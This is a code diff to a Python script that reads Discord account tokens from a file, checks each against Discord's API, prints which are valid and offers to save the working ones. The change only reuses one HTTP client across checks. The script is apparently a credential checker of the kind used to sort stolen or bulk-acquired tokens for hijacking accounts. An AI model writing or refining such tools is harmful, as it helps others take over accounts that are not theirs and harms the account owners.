@@ -5,27 +5,27 @@ from random import randint
 from colorama import init, Fore, Back, Style
 init(convert=True)
 
-async def check(token):
-    client = aiosonic.HTTPClient()
+async def check(token, client):
     response = await client.get(f'https://discord.com/api/v9/users/@me/guild-events', headers={'Authorization': token})
-    await client.shutdown()
     if "You need to verify your account in order to perform this action." in str(await response.text()) or "401: Unauthorized" in str(await response.text()):
         return False
     else:
         return True
 
 async def main():
+    client = aiosonic.HTTPClient()
     try:
         checked = []
         with open('tokens.txt', 'r') as tokens:
             for token in tokens.read().split('\n'):
-                if len(token) > 15 and token not in checked and await check(token) == True:
+                if len(token) > 15 and token not in checked and await check(token, client) == True:
                     print(f'{Fore.GREEN}[Valid]{Fore.WHITE} {token} ')
                     print(Style.RESET_ALL, end='')
                     checked.append(token)
                 else:
                     print(f'{Fore.RED}[Invalid]{Fore.WHITE} {token}')
                     print(Style.RESET_ALL, end='')
+            await client.shutdown()
         if len(checked) > 0:
             save = input(f'{len(checked)} valid tokens\nSave to File (y/n)').lower()
             if save == 'y':
